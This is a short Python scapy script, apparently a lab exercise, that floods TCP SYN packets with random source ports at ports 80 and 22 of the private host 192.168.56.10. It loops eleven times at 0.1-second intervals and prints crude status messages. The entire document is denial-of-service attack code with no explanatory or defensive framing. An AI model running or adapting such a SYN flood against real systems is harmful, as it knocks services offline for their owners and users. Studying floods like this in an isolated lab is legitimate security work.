from scapy.all import *
from time import sleep

target_ip = "192.168.56.10"
interval = 0.1

network_layer = IP(dst = target_ip)

counter = 0
while(counter<=10):
    counter+=1
    port = RandShort()
    transport_layer = TCP(sport = port, dport=[80, 22], flags = "S")
    print("Sending shit ton of SYN to " + target_ip)
    send(network_layer/transport_layer, verbose=False)
    print("Done sending")
    sleep(interval)
